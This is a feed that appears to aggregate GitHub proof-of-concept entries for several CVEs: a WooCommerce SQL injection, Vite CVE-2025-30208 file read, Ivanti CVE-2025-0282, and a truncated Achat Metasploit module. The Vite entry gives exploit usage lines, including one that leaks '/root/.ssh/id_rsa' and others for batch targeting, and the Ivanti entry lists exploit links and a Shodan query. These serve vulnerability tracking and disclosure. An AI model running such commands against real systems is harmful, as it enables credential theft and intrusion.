COMMAND        SQL command to<span class="hljs-built_in"> execute</span><br><span class="hljs-built_in"></span>  SHARE_KEY      share key of the wish list<br><br>optional arguments:<br>  -h, --help     show this help message<span class="hljs-built_in"> and </span>exit<br>  --https        use HTTPS?<br>  --RHOST RHOST  remote host<br>  --RPORT RPORT  remote port<br>  -v, --version  show program&#x27;s version number<span class="hljs-built_in"> and </span>exit<br></code></pre></td></tr></table></figure><h2 id="Affected-Versions"><a href="#Affected-Versions" class="headerlink" title="Affected Versions"></a>Affected Versions</h2><p>All versions of TI WooCommerce Wishlist (WordPress plugin) &lt;&#x3D; 2.8.2</p><h2 id="Patch-Guidance"><a href="#Patch-Guidance" class="headerlink" title="Patch Guidance"></a>Patch Guidance</h2><p>Upgrade to the latest version available.</p><h2 id="Authors"><a href="#Authors" class="headerlink" title="Authors"></a>Authors</h2><p>Made by <a href="https://github.com/sug4r-wr41th">@sug4r-wr41th</a></p><h2 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h2><p>Fair Use disclaimer: for educational purposes only.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; TI WooCommerce Wishlist SQL注入漏洞&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-30712 PoC</title>
    <link href="http://example.com/2025/06/25/github_2654926034/"/>
    <id>http://example.com/2025/06/25/github_2654926034/</id>
    <published>2025-06-25T20:15:20.730Z</published>
    <updated>2025-06-25T20:15:20.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-30712 PoC</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-30712</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> 这是一个用于测试的漏洞概念验证(PoC)。</p><p><strong>来源：</strong> <a href="https://github.com/jamesb5959/CVE-2025-30712-_PoC">https://github.com/jamesb5959/CVE-2025-30712-_PoC</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>test.rs</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-30712 PoC&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-49144 PoC</title>
    <link href="http://example.com/2025/06/25/github_2000073445/"/>
    <id>http://example.com/2025/06/25/github_2000073445/</id>
    <published>2025-06-25T19:45:35.644Z</published>
    <updated>2025-06-25T19:45:35.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-49144 PoC</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49144</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> CVE-2025-49144 PoC供安全研究人员测试和尝试。</p><p><strong>来源：</strong> <a href="https://github.com/TheTorjanCaptain/CVE-2025-49144_PoC">https://github.com/TheTorjanCaptain/CVE-2025-49144_PoC</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>regsvr32_loader.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49144-PoC"><a href="#CVE-2025-49144-PoC" class="headerlink" title="CVE-2025-49144_PoC"></a>CVE-2025-49144_PoC</h2><p>CVE-2025-49144 PoC for security researchers to test and try.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-49144 PoC&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Vite Arbitrary File Read Vulnerability</title>
    <link href="http://example.com/2025/06/25/github_2359697087/"/>
    <id>http://example.com/2025/06/25/github_2359697087/</id>
    <published>2025-06-25T19:45:21.223Z</published>
    <updated>2025-06-25T19:45:21.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Vite Arbitrary File Read Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-30208</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> CVE-2025-30208是Vite开发服务器中的一个中等严重性的任意文件读取漏洞。该漏洞允许通过特制的HTTP请求绕过路径访问限制，暴露任意文件（如系统或源文件）。影响版本包括4.5.0至4.5.9、5.0.0至5.4.14和6.0.0至6.2.2。建议升级到修复版本（4.5.10、5.4.15、6.0.12、6.1.2或6.2.3）并避免将开发服务器暴露在公共网络中。</p><p><strong>产品厂商：</strong> Vite</p><p><strong>产品名称：</strong> Vite</p><p><strong>影响版本：</strong> 4.5.0 – 4.5.9, 5.0.0 – 5.4.14, 6.0.0 – 6.2.2</p><p><strong>来源：</strong> <a href="https://github.com/B1ack4sh/Blackash-CVE-2025-30208">https://github.com/B1ack4sh/Blackash-CVE-2025-30208</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-30208.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-30208-Vite-Arbitrary-File-Read-vulnerability-🌌"><a href="#CVE-2025-30208-Vite-Arbitrary-File-Read-vulnerability-🌌" class="headerlink" title="CVE-2025-30208 Vite Arbitrary File Read vulnerability 🌌"></a>CVE-2025-30208 Vite Arbitrary File Read vulnerability 🌌</h2><p>Here’s a detailed overview of <strong>CVE‑2025‑30208</strong>, a medium-severity arbitrary file‑read vulnerability in Vite’s dev server:</p><hr><h3 id="🛠️-What-is-it"><a href="#🛠️-What-is-it" class="headerlink" title="🛠️ What is it?"></a>🛠️ What is it?</h3><ul><li>Vite’s <code>@fs</code> module allows static file access in development mode with path allowances controlled by <code>server.fs.allow</code>.</li><li>Versions <strong>before</strong> 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10 contain a flaw: URLs crafted with trailing query markers like <code>?raw??</code> or <code>?import&amp;raw??</code> can bypass access restrictions and expose arbitrary files (e.g., system or source files) (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Detail - NVD">nvd.nist.gov</a>).</li></ul><hr><h3 id="🔍-Who’s-affected"><a href="#🔍-Who’s-affected" class="headerlink" title="🔍 Who’s affected?"></a>🔍 Who’s affected?</h3><ul><li><p>Vite dev‑servers explicitly <strong>exposed to the network</strong>, enabled via <code>--host</code> or <code>server.host</code>.</p></li><li><p>Vulnerable version ranges:</p><ul><li>4.5.0 – 4.5.9</li><li>5.0.0 – 5.4.14</li><li>6.0.0 – 6.2.2 (with sub-versions as detailed) (<a href="https://nsfocusglobal.com/vite-arbitrary-file-read-vulnerability-cve-2025-30208/?utm_source=chatgpt.com" title="Vite Arbitrary File Read vulnerability (CVE-2025-30208) - NSFocus">nsfocusglobal.com</a>).</li></ul></li></ul><hr><h3 id="⚠️-Severity-Impact"><a href="#⚠️-Severity-Impact" class="headerlink" title="⚠️ Severity &amp; Impact"></a>⚠️ Severity &amp; Impact</h3><ul><li><strong>CVSS 3.1 score: 5.3 (Medium 🟠)</strong>: Network attack, no privileges, high confidentiality impact (<a href="https://www.wiz.io/vulnerability-database/cve/cve-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Impact, Exploitability, and Mitigation Steps | Wiz">wiz.io</a>).</li><li>Exploitability: straightforward via crafted HTTP requests out of development servers (<a href="https://www.wiz.io/vulnerability-database/cve/cve-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Impact, Exploitability, and Mitigation Steps | Wiz">wiz.io</a>).</li><li>Public PoC is available, including scripts demonstrating <code>/etc/passwd</code> leaks (<a href="https://security.snyk.io/vuln/SNYK-JS-VITE-9512410?utm_source=chatgpt.com" title="Incorrect Authorization in vite | CVE-2025-30208 | Snyk">github.com</a>).</li></ul><hr><h3 id="🛡️-Mitigation-Response"><a href="#🛡️-Mitigation-Response" class="headerlink" title="🛡️ Mitigation &amp; Response"></a>🛡️ Mitigation &amp; Response</h3><ul><li><p><strong>Upgrade Vite</strong> to one of the patched versions:</p><ul><li><strong>6.2.3</strong>, <strong>6.1.2</strong>, <strong>6.0.12</strong>, <strong>5.4.15</strong>, or <strong>4.5.10</strong> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Detail - NVD">nvd.nist.gov</a>).</li></ul></li><li><p><strong>Avoid exposing</strong> dev servers to public networks; limit with <code>localhost</code> or firewall rules (<a href="https://www.wiz.io/vulnerability-database/cve/cve-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Impact, Exploitability, and Mitigation Steps | Wiz">wiz.io</a>).</p></li><li><p>Additional scanning tools (e.g., NSFocus EZ, Sangfor, Tenable) support detection (<a href="https://nsfocusglobal.com/vite-arbitrary-file-read-vulnerability-cve-2025-30208/?utm_source=chatgpt.com" title="Vite Arbitrary File Read vulnerability (CVE-2025-30208) - NSFocus">nsfocusglobal.com</a>).</p></li></ul><hr><h3 id="✅-Summary-Table"><a href="#✅-Summary-Table" class="headerlink" title="✅ Summary Table"></a>✅ Summary Table</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string"> Aspect             </span>|<span class="hljs-string"> Details                                                    </span>|<br>|<span class="hljs-string"> ------------------ </span>|<span class="hljs-string"> ---------------------------------------------------------- </span>|<br>|<span class="hljs-string"> **Flaw**           </span>|<span class="hljs-string"> `@fs` path filter bypass via malformed query strings       </span>|<br>|<span class="hljs-string"> **Versions**       </span>|<span class="hljs-string"> &lt;4.5.10, &lt;5.4.15, &lt;6.0.12, &lt;6.1.2, &lt;6.2.3                  </span>|<br>|<span class="hljs-string"> **Severity**       </span>|<span class="hljs-string"> Medium (CVSS 5.3), network exploit, confidentiality impact </span>|<br>|<span class="hljs-string"> **Exploitability** </span>|<span class="hljs-string"> Easy; PoC exists                                           </span>|<br>|<span class="hljs-string"> **Patched in**     </span>|<span class="hljs-string"> Vite 4.5.10, 5.4.15, 6.0.12, 6.1.2, 6.2.3                  </span>|<br>|<span class="hljs-string"> **Mitigation**     </span>|<span class="hljs-string"> Upgrade + avoid exposing dev server                        </span>|<br></code></pre></td></tr></table></figure><hr><h3 id="🔗-References-Sources"><a href="#🔗-References-Sources" class="headerlink" title="🔗 References &amp; Sources"></a>🔗 References &amp; Sources</h3><ul><li>NVD &#x2F; GitHub Advisory (Mar 24 2025) (<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Detail - NVD">nvd.nist.gov</a>, <a href="https://www.wiz.io/vulnerability-database/cve/cve-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Impact, Exploitability, and Mitigation Steps | Wiz">wiz.io</a>, <a href="https://www.recordedfuture.com/vulnerability-database/CVE-2025-30208?utm_source=chatgpt.com" title="CVE-2025-30208 Description, Impact and Technical Details">security.snyk.io</a>, [recordedfuture.com][6])</li><li>Technical writeups: NSFocus, Sangfor, Snyk, Recorded Future&#x20;</li></ul><hr><h3 id="✅-Recommended-Next-Steps"><a href="#✅-Recommended-Next-Steps" class="headerlink" title="✅ Recommended Next Steps"></a>✅ Recommended Next Steps</h3><ol><li><strong>Audit your Vite versions</strong> in development environments, especially any exposed externally.</li><li><strong>Upgrade</strong> immediately to a fixed version.</li><li><strong>Restrict access</strong> to development servers—bind to <code>localhost</code>, use VPNs or firewalls.</li><li><strong>Run security scans&#x2F;tools</strong> to detect CVE‑2025‑30208 in your infrastructure.</li><li><strong>Monitor your logs</strong> for suspicious <code>/@fs/...?...?</code> requests.</li></ol><p>Let me know if you’d like help implementing fixes, crafting firewall rules, or assessing exposure!</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples:"></a>Examples:</h3><p>1- Single target exploitation:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span>.py -u example.com:<span class="hljs-number">5173</span><br></code></pre></td></tr></table></figure><p>2- Single target with custom LFI path to leak the file we want:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span><span class="hljs-selector-class">.py</span> -u example<span class="hljs-selector-class">.com</span>:<span class="hljs-number">5173</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;/root/.ssh/id_rsa&#x27;</span><br></code></pre></td></tr></table></figure><p>3- Batch exploitation with multiple targets:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span>.py -f targets.txt<br></code></pre></td></tr></table></figure><p>4- Custom bypass query:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span>.py -u example.com:<span class="hljs-number">5173</span> -b <span class="hljs-string">&quot;?raw&amp;url&quot;</span><br></code></pre></td></tr></table></figure><p>5- Using a proxy (e.g. Burp Suite):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span>.py -u example.com:<span class="hljs-number">5173</span> --proxy http://<span class="hljs-number">127.0.0.1:8080</span><br></code></pre></td></tr></table></figure><p>6- Custom output directory:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span>.py -u example.com:<span class="hljs-number">5173</span> -o ./loot<br></code></pre></td></tr></table></figure><p>7- Increase thread count in batch mode:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2025</span>-<span class="hljs-number">30208</span>.py -f targets.txt -t <span class="hljs-number">50</span><br></code></pre></td></tr></table></figure><h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer"></a>⚠️ Disclaimer</h3><p>This project is created for <strong>educational and research purposes only</strong>. The author is not responsible for any misuse of this tool or information provided herein.</p><p>Using this software against systems without explicit permission is <strong>illegal</strong> and strictly prohibited. Always ensure you have <strong>written authorization</strong> before performing any security testing.</p><p>By using this repository, you agree to comply with all applicable local, state, national, and international laws.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Vite Arbitrary File Read Vulnerability&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
  </entry>
  
  <entry>
    <title>Ivanti Buffer Overflow Vulnerability</title>
    <link href="http://example.com/2025/06/25/github_2121782117/"/>
    <id>http://example.com/2025/06/25/github_2121782117/</id>
    <published>2025-06-25T19:30:20.459Z</published>
    <updated>2025-06-25T19:30:20.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Ivanti Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-0282</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Ivanti Connect Secure &lt; 22.7R2.5、Ivanti Policy Secure &lt; 22.7R1.2以及Ivanti Neurons for ZTA gateways &lt; 22.7R2.3中存在一个基于栈的缓冲区溢出漏洞，该漏洞由不当的输入处理引起，允许远程未认证的攻击者执行任意代码。利用此漏洞需要发送精心构造的请求。</p><p><strong>产品厂商：</strong> Ivanti</p><p><strong>产品名称：</strong> Ivanti Connect Secure, Ivanti Policy Secure, Ivanti Neurons for ZTA gateways</p><p><strong>影响版本：</strong> Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, Ivanti Neurons for ZTA gateways &lt; 22.7R2.3</p><p><strong>搜索语法：</strong> http.title:”ivanti connect secure”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12130">https://github.com/projectdiscovery/nuclei-templates/issues/12130</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Ivanti Connect Secure &lt; 22.7R2.5, Ivanti Policy Secure &lt; 22.7R1.2, and Ivanti Neurons for ZTA gateways &lt; 22.7R2.3 contain a stack-based buffer overflow caused by improper input handling, letting remote unauthenticated attackers execute arbitrary code, exploit requires sending crafted requests.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day</a></li><li><a href="https://github.com/sfewer-r7/CVE-2025-0282">https://github.com/sfewer-r7/CVE-2025-0282</a></li><li><a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a></li><li><a href="https://github.com/punitdarji/Ivanti-CVE-2025-0282">https://github.com/punitdarji/Ivanti-CVE-2025-0282</a></li><li><a href="https://vulncheck.com/xdb/043030d6caa4">https://vulncheck.com/xdb/043030d6caa4</a></li><li><a href="https://github.com/44xo/CVE-2025-0282">https://github.com/44xo/CVE-2025-0282</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:44xo&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/AdaniKamal/CVE-2025-0282">https://github.com/AdaniKamal/CVE-2025-0282</a></li><li><a href="https://vulncheck.com/xdb/858b463ecabe">https://vulncheck.com/xdb/858b463ecabe</a></li><li><a href="https://github.com/almanatra/CVE-2025-0282">https://github.com/almanatra/CVE-2025-0282</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:almanatra&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/Hexastrike/Ivanti-Connect-Secure-Logs-Parser">https://github.com/Hexastrike/Ivanti-Connect-Secure-Logs-Parser</a></li><li><a href="https://vulncheck.com/xdb/d343e6784986">https://vulncheck.com/xdb/d343e6784986</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:sfewer-r7&#x2F;CVE-2025-0282.git</li><li><a href="https://github.com/watchtowrlabs/CVE-2025-0282">https://github.com/watchtowrlabs/CVE-2025-0282</a></li><li><a href="https://github.com/rxwx/pulse-meter">https://github.com/rxwx/pulse-meter</a></li><li><a href="https://github.com/AnonStorks/CVE-2025-0282-Full-version">https://github.com/AnonStorks/CVE-2025-0282-Full-version</a></li><li><a href="https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit">https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-ivanti-connect-secure"><a href="#Shodan-Query-http-title-ivanti-connect-secure" class="headerlink" title="Shodan Query: http.title:&quot;ivanti connect secure&quot;"></a>Shodan Query: <code>http.title:&quot;ivanti connect secure&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Ivanti Buffer Overflow Vulnerability&lt;/p</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Achat 0150 beta7 Buffer Overflow Vulnerability</title>
    <link href="http://example.com/2025/06/25/github_1441788039/"/>
    <id>http://example.com/2025/06/25/github_1441788039/</id>
    <published>2025-06-25T19:15:42.015Z</published>
    <updated>2025-06-25T19:15:42.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Achat 0.150 beta7 Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2015-1578</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Achat 0.150 beta7存在缓冲区溢出漏洞，攻击者可通过特制的UDP包触发漏洞，实现远程代码执行。</p><p><strong>产品厂商：</strong> <a href="http://achat.sourceforge.net/">http://achat.sourceforge.net/</a></p><p><strong>产品名称：</strong> Achat</p><p><strong>影响版本：</strong> 0.150 beta7</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/667a1b82138b7979f02c38b603c989e5e36ee5c9/modules%2Fexploits%2Fwindows%2Fmisc%2Fachat_bof_msfvenom.rb">https://github.com/rapid7/metasploit-framework/blob/667a1b82138b7979f02c38b603c989e5e36ee5c9/modules%2Fexploits%2Fwindows%2Fmisc%2Fachat_bof_msfvenom.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment"># frozen_string_literal: true</span><br><br><span class="hljs-comment">##</span><br><span 